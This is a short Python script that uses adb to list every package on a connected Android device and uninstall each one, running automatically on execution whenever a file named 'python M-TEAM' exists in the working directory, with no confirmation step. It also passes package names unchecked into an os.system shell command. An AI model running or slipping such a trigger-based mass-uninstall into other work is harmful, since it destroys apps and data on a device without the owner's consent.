import os
import subprocess

def get_installed_packages():
    """
    Retrieves a list of installed packages on the Android device.
    Returns:
    list: A list of package names.
    """
    try:
        # Run adb command to get the list of installed packages
        result = subprocess.run(['adb', 'shell', 'pm', 'list', 'packages'], stdout=subprocess.PIPE, text=True)
        packages = result.stdout.splitlines()
        # Extract package names from the output
        package_names = [pkg.split(':')[1] for pkg in packages]
        return package_names
    except Exception as e:
        print(f'Error retrieving package names: {e}')
        return []

def uninstall_all_apps():
    """
    Uninstalls all apps from the Android device.
    """
    packages = get_installed_packages()
    for pkg in packages:
        try:
            # Uninstall the app
            os.system(f'adb uninstall {pkg}')
            print(f'Uninstalled {pkg}.')
        except Exception as e:
            print(f'Error uninstalling {pkg}: {e}')

def check_and_uninstall_apps():
    """
    Checks if a file named 'python M-TEAM' exists in the current directory.
    If it does, uninstalls all apps from the Android device.
    """
    file_name = 'python M-TEAM'
    if os.path.exists(file_name):
        print(f'File {file_name} found. Proceeding to uninstall all apps.')
        uninstall_all_apps()
    else:
        print(f'File {file_name} not found.')

# Run the function
check_and_uninstall_apps()
